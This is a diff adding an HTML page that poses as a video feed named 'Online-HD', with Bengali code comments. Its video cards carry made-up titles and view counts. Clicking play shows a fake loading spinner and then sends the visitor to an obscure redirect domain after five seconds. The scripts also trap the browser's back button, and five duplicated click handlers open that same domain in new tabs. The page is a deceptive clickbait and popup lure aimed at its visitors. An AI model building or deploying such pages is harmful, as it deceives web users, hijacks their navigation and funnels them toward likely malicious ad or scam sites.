@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online-HD - New Feed</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background:#000; color:#fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            padding-top:56px;
+        }
+        header {
+            position:fixed; top:0; left:0; right:0; height:56px;
+            background:#0d0d0d; display:flex; align-items:center;
+            justify-content:space-between; padding:0 18px;
+            border-bottom:1px solid #222; z-index:100;
+        }
+        .logo { position:absolute; left:50%; transform:translateX(-50%);
+                font-weight:bold; font-size:19px; }
+        .logo span { color:#ff9800; }
+
+        /* ভিডিও ফিড কন্টেইনার */
+        .video-feed {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            padding: 20px 12px 40px;
+        }
+
+        /* প্রতিটি ভিডিও আইটেম কার্ড */
+        .video-item {
+            background: #111;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            border: 1px solid #222;
+        }
+
+        /* থাম্বনেইল কন্টেইনার */
+        .video-thumbnail {
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            position: relative;
+            background-color: #000;
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* থাম্বনেইলের উপর ব্লার এফেক্ট */
+        .video-thumbnail::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(2px);
+            -webkit-backdrop-filter: blur(2px);
+            z-index: 1;
+        }
+
+        /* প্লে বাটন */
+        .play-button {
+            width: 60px;
+            height: 60px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(255,255,255,0.2);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            backdrop-filter: blur(3px);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+            animation: pulse 2.5s infinite;
+        }
+
+        .play-button:hover {
+            background: rgba(255,255,255,0.25);
+            transform: translate(-50%, -50%) scale(1.05);
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+            50% { box-shadow: 0 4px 20px rgba(255,152,0,0.3); }
+        }
+
+        /* লোডিং স্পিনার */
+        .spinner {
+            display: none;
+            width: 28px;
+            height: 28px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #ff9800;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* লোডিং অবস্থা */
+        .is-loading svg { display: none; }
+        .is-loading .spinner { display: block; }
+        .is-loading .play-button { animation: none; pointer-events: none; background: rgba(0,0,0,0.5); }
+
+        /* ভিডিওর তথ্য */
+        .video-info {
+            padding: 16px;
+        }
+
+        .video-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #eee;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .video-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: #aaa;
+        }
+
+        .views {
+            color: #ff4444;
+            font-weight: 600;
+        }
+
+        .rating {
+            display: flex;
+            gap: 2px;
+        }
+
+        .rating svg {
+            width: 18px;
+            height: 18px;
+            fill: #ffb400;
+            filter: drop-shadow(0 0 3px #ff9800);
+        }
+
+    </style>
+</head>
+<body>
+
+<header>
+    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ff9800" stroke-width="3" stroke-linecap="round">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+    <div class="logo">Online<span>-HD</span></div>
+    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#ff9800" stroke-width="3" stroke-linecap="round">
+        <circle cx="11" cy="11" r="8"></circle>
+        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+    </svg>
+</header>
+
+<div class="video-feed">
+
+    <!-- ভিডিও কার্ড ১ -->
+    <div class="video-item" data-fb-link="https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c
+">
+        <div class="video-thumbnail" style="background-image: url('https://files.catbox.moe/rv2njz.jpg');">
+            <div class="play-button">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="#ffffff">
+                    <polygon points="7,4 20,12 7,20 7,4"></polygon>
+                </svg>
+                <div class="spinner"></div>
+            </div>
+        </div>
+        <div class="video-info">
+            <div class="video-title">The Silence of Nature - Relaxing Visuals</div>
+            <div class="video-meta">
+                <span class="views">Heart Views: 112,691</span>
+                <div class="rating">
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ভিডিও কার্ড ২ -->
+    <div class="video-item" data-fb-link="https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c
+">
+        <div class="video-thumbnail" style="background-image: url('https://files.catbox.moe/mz2rsb.jpg');">
+            <div class="play-button">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="#ffffff">
+                    <polygon points="7,4 20,12 7,20 7,4"></polygon>
+                </svg>
+                <div class="spinner"></div>
+            </div>
+        </div>
+        <div class="video-info">
+            <div class="video-title">Epic Urban Exploration: Forgotten Places</div>
+            <div class="video-meta">
+                <span class="views">Heart Views: 89,112</span>
+                <div class="rating">
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ভিডিও কার্ড ৩ -->
+    <div class="video-item" data-fb-link="https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c
+">
+        <div class="video-thumbnail" style="background-image: url('https://files.catbox.moe/nj6uhe.jpg');">
+            <div class="play-button">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="#ffffff">
+                    <polygon points="7,4 20,12 7,20 7,4"></polygon>
+                </svg>
+                <div class="spinner"></div>
+            </div>
+        </div>
+        <div class="video-info">
+            <div class="video-title">Ocean Depths: Wonders of the Deep Blue</div>
+            <div class="video-meta">
+                <span class="views">Heart Views: 231,567</span>
+                <div class="rating">
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ভিডিও কার্ড ৪ -->
+    <div class="video-item" data-fb-link="https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c
+">
+        <div class="video-thumbnail" style="background-image: url('https://files.catbox.moe/wvnzr9.jpg');">
+            <div class="play-button">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="#ffffff">
+                    <polygon points="7,4 20,12 7,20 7,4"></polygon>
+                </svg>
+                <div class="spinner"></div>
+            </div>
+        </div>
+        <div class="video-info">
+            <div class="video-title">Midnight Drive: Neon City Lights</div>
+            <div class="video-meta">
+                <span class="views">Heart Views: 154,233</span>
+                <div class="rating">
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2 L15 8.7 L22 9.2 L17 14 L18.5 21 L12 17.5 L5.5 21 L7 14 L2 9.2 L9 8.7 Z"/></svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<!-- জাভাস্ক্রিপ্ট -->
+<script>
+    const playButtons = document.querySelectorAll('.play-button');
+
+    playButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            const videoItem = this.closest('.video-item');
+            const fbLink = videoItem.getAttribute('data-fb-link');
+
+            // লোডিং অবস্থা শুরু
+            videoItem.classList.add('is-loading');
+
+            // ৫ সেকেন্ড পরে রিডাইরেক্ট
+            setTimeout(function() {
+                window.location.href = fbLink;
+            }, 5000);
+        });
+    });
+
+    // ব্যাক বাটন নিষ্ক্রিয় করার কোড
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.go(1);
+    };
+
+
+<script>
+(function () {
+  history.pushState(null, null, location.href);
+
+  window.onpopstate = function () {
+    history.pushState(null, null, location.href);
+  };
+})();
+</script>
+
+</script>
+
+<script>
+document.addEventListener("click", function () {
+    window.open(
+        "https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c",
+        "_blank"
+    );
+}, { once: true });
+</script>
+
+<script>
+document.addEventListener("click", function () {
+    window.open(
+        "https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c",
+        "_blank"
+    );
+}, { once: true });
+</script>
+
+<script>
+document.addEventListener("click", function () {
+    window.open(
+        "https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c",
+        "_blank"
+    );
+}, { once: true });
+</script>
+
+<script>
+document.addEventListener("click", function () {
+    window.open(
+        "https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c",
+        "_blank"
+    );
+}, { once: true });
+</script>
+
+
+<script>
+document.addEventListener("click", function () {
+    window.open(
+        "https://dyingefforlessefforlessours.com/eypxis9p7?key=66eb7d3903f8cc271f28d9aa2e918f9c",
+        "_blank"
+    );
+}, { once: true });
+</script>
+
+</body>
+</html>
